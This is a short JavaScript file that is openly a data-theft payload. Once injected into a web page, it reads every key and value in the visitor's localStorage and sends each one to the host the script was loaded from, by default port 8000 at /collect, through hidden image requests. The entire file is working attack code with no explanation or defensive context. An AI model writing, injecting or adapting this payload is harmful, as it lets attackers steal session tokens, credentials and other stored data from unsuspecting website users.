(function exfiltrateLocalStorage() {
  const currentScript = document.currentScript;
  const scriptUrl = currentScript ? new URL(currentScript.src) : null;

  if (!scriptUrl) {
    return;
  }

  const exfilHost = scriptUrl.hostname;
  const exfilProtocol = scriptUrl.protocol;
  const exfilPort = scriptUrl.searchParams.get('collectPort') || '8000';
  const exfilPath = scriptUrl.searchParams.get('collectPath') || '/collect';

  for (let i = 0; i < localStorage.length; i += 1) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key) || '';
    const target = new URL(`${exfilProtocol}//${exfilHost}:${exfilPort}${exfilPath}`);

    target.searchParams.set('key', key || '');
    target.searchParams.set('value', value);

    new Image().src = target.toString();
  }
})();
